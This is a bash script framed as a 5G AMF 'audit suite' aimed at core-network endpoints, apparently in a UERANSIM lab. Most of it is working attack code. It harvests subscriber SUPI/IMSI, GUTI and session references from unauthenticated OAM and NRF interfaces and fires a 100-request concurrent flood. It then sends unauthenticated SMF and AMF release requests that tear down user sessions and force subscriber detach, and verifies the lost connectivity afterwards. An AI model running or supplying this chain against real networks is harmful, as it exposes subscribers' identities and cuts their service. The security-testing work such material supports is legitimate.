#!/usr/bin/env bash
set -e

AMF_SBI="http://10.0.0.18:8000"
NRF_SBI="http://10.0.0.10:8000"
SMF_SBI="http://10.0.0.2:8000"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
UE_LOG="$SCRIPT_DIR/ue.log"

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BOLD='\033[1m'
NC='\033[0m'

prompt_approval() {
    local phase_title="$1"
    echo -e "${YELLOW}------------------------------------------------------------${NC}"
    echo -e "${BOLD}[APPROVAL REQUIRED] Ready to execute: ${phase_title}${NC}"
    read -p "Press [Enter] to approve (or type 's' to skip): " USER_CHOICE
    echo -e "${YELLOW}------------------------------------------------------------${NC}"
    if [[ "$USER_CHOICE" =~ ^[Ss]$ ]]; then
        echo -e "${RED}[*] Skipped: ${phase_title}.${NC}\n"
        return 1
    fi
    return 0
}

clear
echo -e "${CYAN}======================================================================"
echo "         5G AMF SERVICE-BASED ARCHITECTURE AUDIT SUITE                "
echo "        (Reconnaissance First -> Destructive Exploits Last)           "
echo -e "======================================================================${NC}"
echo "AMF Target: $AMF_SBI"
echo "NRF Target: $NRF_SBI"
echo "SMF Target: $SMF_SBI"
echo "UE Log Path: $UE_LOG"
echo ""

# --------------------------------------------------------------------------
# STEP 1: SERVICE DISCOVERY (BASE URL PROBING)
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " STEP 1: Standard Service Discovery (Base URL Probing)                "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Reference:${NC} AMF.txt [Service discovery]"
echo -e "${BOLD}Purpose:${NC} Probes auxiliary AMF services (namf-comm, namf-mt, namf-loc) to check reachability."
echo -e "${BOLD}Destructive Impact:${NC} None (Safe to run)"
echo ""
echo -e "${BOLD}Commands to run:${NC}"
echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-comm/v1/${NC}"
echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-mt/v1/${NC}"
echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-loc/v1/${NC}"
echo ""

if prompt_approval "Step 1: Service Discovery"; then
    curl -s -o /dev/null -w "  namf-comm: HTTP %{http_code}\n" "$AMF_SBI/namf-comm/v1/" || true
    curl -s -o /dev/null -w "  namf-mt:   HTTP %{http_code}\n" "$AMF_SBI/namf-mt/v1/" || true
    curl -s -o /dev/null -w "  namf-loc:  HTTP %{http_code}\n" "$AMF_SBI/namf-loc/v1/" || true
    echo ""
fi

# --------------------------------------------------------------------------
# STEP 2: NRF INSTANCE IDENTIFICATION
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " STEP 2: AMF Instance Enumeration via NRF (nnrf-nfm)                  "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Reference:${NC} 3GPP TS 29.510 (Nnrf_NFManagement) / AMF.txt"
echo -e "${BOLD}Purpose:${NC} Dumps registered AMF profile metadata and service endpoints from NRF."
echo -e "${BOLD}Destructive Impact:${NC} None (Safe to run)"
echo ""
CMD_NRF="curl -s \"$NRF_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF\" -H \"Accept: application/json\""
echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_NRF${NC}\n"

if prompt_approval "Step 2: NRF Discovery"; then
    NRF_OUT=$(eval "$CMD_NRF" || true)
    if [ -n "$NRF_OUT" ] && [ "$NRF_OUT" != "null" ]; then
        echo "$NRF_OUT" | jq . 2>/dev/null || echo "$NRF_OUT"
    else
        echo -e "${YELLOW}[!] No instance array returned by NRF. Continuing...${NC}"
    fi
    echo ""
fi

# --------------------------------------------------------------------------
# STEP 3: SUBSCRIBER CONTEXT RECONNAISSANCE (namf-oam)
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " STEP 3: Global Subscriber Context Extraction (namf-oam)              "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Reference:${NC} 3GPP TS 29.518 (Namf_OAM) / AMF.txt"
echo -e "${BOLD}Purpose:${NC} Harvests SUPI, GUTI, TAC, and session handles from active AMF memory."
echo -e "${BOLD}Destructive Impact:${NC} None (Passive information disclosure)"
echo ""
CMD_DUMP="curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\""
echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_DUMP | jq .${NC}\n"

TARGET_SUPI=""
TARGET_GUTI=""
SM_REF=""
PDU_ID=""

if prompt_approval "Step 3: Global Context Dump"; then
    RAW_CONTEXTS=$(eval "$CMD_DUMP")
    if [ -z "$RAW_CONTEXTS" ] || [ "$RAW_CONTEXTS" == "null" ] || [ "$RAW_CONTEXTS" == "[]" ]; then
        echo -e "${RED}[-] No registered UEs found in AMF memory. Verify UE registration.${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Dumped Active Subscribers:${NC}"
    echo "$RAW_CONTEXTS" | jq .

    TARGET_SUPI=$(echo "$RAW_CONTEXTS" | jq -r '.[0].Supi')
    TARGET_GUTI=$(echo "$RAW_CONTEXTS" | jq -r '.[0].Guti')
    SM_REF=$(echo "$RAW_CONTEXTS" | jq -r '.[0].PduSessions[0].SmContextRef // empty')
    PDU_ID=$(echo "$RAW_CONTEXTS" | jq -r '.[0].PduSessions[0].PduSessionId // 1')

    echo ""
    echo -e "${BOLD}============================================================${NC}"
    echo -e "${BOLD} [!] EXFILTRATED METADATA FOR TARGETING:${NC}"
    echo -e "     - SUPI (IMSI):  ${GREEN}$TARGET_SUPI${NC}"
    echo -e "     - 5G-GUTI:      ${GREEN}$TARGET_GUTI${NC}"
    echo -e "     - SmContextRef: ${GREEN}$SM_REF${NC}"
    echo -e "${BOLD}============================================================${NC}\n"
fi

# --------------------------------------------------------------------------
# STEP 4: TARGETED SINGLE-UE QUERY
# --------------------------------------------------------------------------
if [ -n "$TARGET_SUPI" ]; then
    echo -e "${CYAN}======================================================================"
    echo " STEP 4: Targeted Individual Subscriber Query                         "
    echo -e "======================================================================${NC}"
    echo -e "${BOLD}Reference:${NC} AMF.txt [/registered-ue-context/imsi-<number>]"
    echo -e "${BOLD}Purpose:${NC} Queries the target SUPI directly by ID to test endpoint filtering."
    echo -e "${BOLD}Destructive Impact:${NC} None (Passive query)"
    echo ""
    CMD_SINGLE="curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context/$TARGET_SUPI\""
    echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_SINGLE | jq .${NC}\n"

    if prompt_approval "Step 4: Individual SUPI Query"; then
        SINGLE_OUT=$(eval "$CMD_SINGLE")
        echo -e "${GREEN}[+] Filtered Result for $TARGET_SUPI:${NC}"
        echo "$SINGLE_OUT" | jq . 2>/dev/null || echo "$SINGLE_OUT"
        echo ""
    fi
fi

# --------------------------------------------------------------------------
# STEP 5: ASYNCHRONOUS CONCURRENCY STRESS TEST
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " STEP 5: Asynchronous AMF OAM Concurrency Stress Test                 "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Reference:${NC} AMF.txt [bombard AMF with requests]"
echo -e "${BOLD}Purpose:${NC} Evaluates AMF thread handling and latency under 100 concurrent requests."
echo -e "${BOLD}Destructive Impact:${NC} Low/Non-destructive (Temporary load; does not kill sessions)"
echo ""
echo -e "${BOLD}Command to run:${NC}"
echo -e "  ${GREEN}for i in {1..100}; do curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" > /dev/null & done; wait${NC}\n"

if prompt_approval "Step 5: Concurrency Flood"; then
    echo -e "${BOLD}[+] Firing 100 parallel requests...${NC}"
    START_T=$(date +%s%N)
    for i in {1..100}; do
        curl -s "$AMF_SBI/namf-oam/v1/registered-ue-context" > /dev/null &
    done
    wait
    END_T=$(date +%s%N)
    DIFF_MS=$(( (END_T - START_T) / 1000000 ))
    echo -e "${GREEN}[+] Completed 100 concurrent requests in ${DIFF_MS} ms.${NC}\n"
fi

# --------------------------------------------------------------------------
# STEP 6: REAL-TIME MONITORING LOOP
# --------------------------------------------------------------------------
echo -e "${CYAN}======================================================================"
echo " STEP 6: Real-Time Network State Monitoring                           "
echo -e "======================================================================${NC}"
echo -e "${BOLD}Reference:${NC} AMF.txt [Real life network monitoring]"
echo -e "${BOLD}Purpose:${NC} Runs continuous polling to observe live session states before teardowns."
echo -e "${BOLD}Destructive Impact:${NC} None"
echo ""
echo -e "${BOLD}Command to run:${NC}"
echo -e "  ${GREEN}watch -n 3 'date; curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" | jq \".[] | {Supi, CmState, AccessType}\"'${NC}\n"

read -p "[?] Enter live monitoring view? (y/N): " VIEW_MONITOR
if [[ "$VIEW_MONITOR" =~ ^[Yy]$ ]]; then
    echo -e "${BOLD}[*] Starting watch loop. Press [Ctrl+C] when ready to continue to teardowns...${NC}"
    watch -n 3 "date; curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" | jq '.[] | {Supi, CmState, AccessType}' 2>/dev/null || echo 'No active UEs'"
fi
echo ""

# ==========================================================================
# DESTRUCTIVE EXPLOITATION STAGE (TERMINATION ATTACKS WITH VERIFICATION)
# ==========================================================================
echo -e "${RED}======================================================================"
echo "                   DESTRUCTIVE EXPLOITATION PHASE                     "
echo "  The attacks below terminate sessions and sever user-plane traffic.  "
echo -e "======================================================================${NC}\n"

# --------------------------------------------------------------------------
# STEP 7: SMF DIRECT PDU SESSION RELEASE (nsmf-pdusession)
# --------------------------------------------------------------------------
if [ -n "$SM_REF" ]; then
    echo -e "${CYAN}======================================================================"
    echo " STEP 7: Unauthenticated SMF PDU Session Teardown                     "
    echo -e "======================================================================${NC}"
    echo -e "${BOLD}Reference:${NC} 3GPP TS 29.502 (Nsmf_PDUSession)"
    echo -e "${BOLD}Target:${NC} SmContextRef: $SM_REF"
    echo -e "${BOLD}Destructive Impact:${NC} HIGH. Erases the UPF forwarding rule; kills internet traffic on uesimtun0."
    echo ""
    CMD_SMF="curl -i -X POST \"$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release\" \\
      -H \"Content-Type: application/json\" \\
      -d '{\"cause\": \"PDU_SESSION_STATUS_MISMATCH\"}'"
    echo -e "${BOLD}Command to run:${NC}\n${GREEN}$CMD_SMF${NC}\n"

    if prompt_approval "Step 7: SMF Session Teardown"; then
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
          "$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release" \
          -H "Content-Type: application/json" \
          -d '{"cause": "PDU_SESSION_STATUS_MISMATCH"}')

        echo -e "${BOLD}[+] SMF Response:${NC} HTTP $HTTP_CODE"
        if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 204 ]; then
            echo -e "${GREEN}[+] SUCCESS: SMF released user-plane context.${NC}"
        fi
        
        # ------------------------------------------------------------------
        # STEP 7 VERIFICATION: Data Plane Ping & Interface Inspection
        # ------------------------------------------------------------------
        echo ""
        echo -e "${YELLOW}>>> [VERIFYING IMPACT ON UERANSIM (Step 7)] <<<${NC}"
        echo -e "${BOLD}1. Checking Data-Plane Disruption:${NC}"
        echo "Command: ping -c 3 -W 1 -I uesimtun0 8.8.8.8"
        if ! ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
            echo -e "   ${GREEN}[CONFIRMED] Traffic through uesimtun0 dropped! 100% packet loss.${NC}"
        else
            echo -e "   ${RED}[!] Traffic is still passing. Check SMF/UPF association.${NC}"
        fi

        echo -e "\n${BOLD}2. Checking uesimtun0 status:${NC}"
        ip addr show dev uesimtun0 2>/dev/null || echo -e "   ${GREEN}uesimtun0 interface has been removed.${NC}"

        echo -e "\n${BOLD}3. Inspecting latest UERANSIM UE log entries:${NC}"
        if [ -f "$UE_LOG" ]; then
            tail -n 8 "$UE_LOG"
        fi
        echo ""
    fi
fi

# --------------------------------------------------------------------------
# STEP 8: FORCED NAS RELEASE VIA namf-comm
# --------------------------------------------------------------------------
if [ -n "$TARGET_SUPI" ]; then
    echo -e "${CYAN}======================================================================"
    echo " STEP 8: Forced Subscriber Detach via namf-comm                       "
    echo -e "======================================================================${NC}"
    echo -e "${BOLD}Reference:${NC} 3GPP TS 29.518 / AMF.txt [Trigger an UE Release via curl]"
    echo -e "${BOLD}Target SUPI:${NC} $TARGET_SUPI"
    echo -e "${BOLD}Destructive Impact:${NC} CRITICAL. Forcibly tears down the radio connection and drops the UE context."
    echo ""
    CMD_COMM="curl -i -X POST \"$AMF_SBI/namf-comm/v1/ue-contexts/$TARGET_SUPI/release\" \\
      -H \"Content-Type: application/json\" \\
      -d '{\"pduSessionId\": $PDU_ID, \"cause\": \"NAS\", \"ngApCause\": {\"group\": 1, \"value\": 2}}'"
    echo -e "${BOLD}Command to run:${NC}\n${GREEN}$CMD_COMM${NC}\n"

    if prompt_approval "Step 8: Forced AMF Release"; then
        HTTP_COMM_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
          "$AMF_SBI/namf-comm/v1/ue-contexts/$TARGET_SUPI/release" \
          -H "Content-Type: application/json" \
          -d "{\"pduSessionId\": $PDU_ID, \"cause\": \"NAS\", \"ngApCause\": {\"group\": 1, \"value\": 2}}")

        echo -e "${BOLD}[+] AMF Response:${NC} HTTP $HTTP_COMM_CODE"
        if [ "$HTTP_COMM_CODE" -eq 200 ] || [ "$HTTP_COMM_CODE" -eq 204 ]; then
            echo -e "${GREEN}[+] SUCCESS: AMF accepted context release for $TARGET_SUPI.${NC}"
        fi

        # ------------------------------------------------------------------
        # STEP 8 VERIFICATION: UE Interface, State, and Logs
        # ------------------------------------------------------------------
        echo ""
        echo -e "${YELLOW}>>> [VERIFYING IMPACT ON UERANSIM (Step 8)] <<<${NC}"
        sleep 1

        echo -e "${BOLD}1. Checking TUN Interface (uesimtun0) Status:${NC}"
        if ip addr show dev uesimtun0 >/dev/null 2>&1; then
            IF_STATE=$(ip -o link show dev uesimtun0 | awk '{print $9}')
            echo -e "   Interface State: ${YELLOW}$IF_STATE${NC}"
        else
            echo -e "   ${GREEN}[CONFIRMED] uesimtun0 has been destroyed by the UE process.${NC}"
        fi

        echo -e "\n${BOLD}2. Inspecting UERANSIM UE Log (Disconnect & Deregistration Signatures):${NC}"
        if [ -f "$UE_LOG" ]; then
            tail -n 12 "$UE_LOG"
        else
            echo "   [!] ue.log not found at $UE_LOG"
        fi

        echo -e "\n${BOLD}3. Confirming Subscriber Context Eviction from AMF:${NC}"
        RECHECK=$(curl -s "$AMF_SBI/namf-oam/v1/registered-ue-context" || true)
        if [[ "$RECHECK" == "null" || "$RECHECK" == "[]" || -z "$RECHECK" ]]; then
            echo -e "   ${GREEN}[CONFIRMED] AMF registered-ue-context is now EMPTY (UE completely deregistered).${NC}"
        else
            echo -e "   Active contexts remaining in AMF: $(echo "$RECHECK" | jq -c .)"
        fi
        echo ""
    fi
fi

echo -e "${CYAN}======================================================================"
echo " AMF Audit Complete. Both non-destructive and destructive tests done. "
echo -e "======================================================================${NC}"
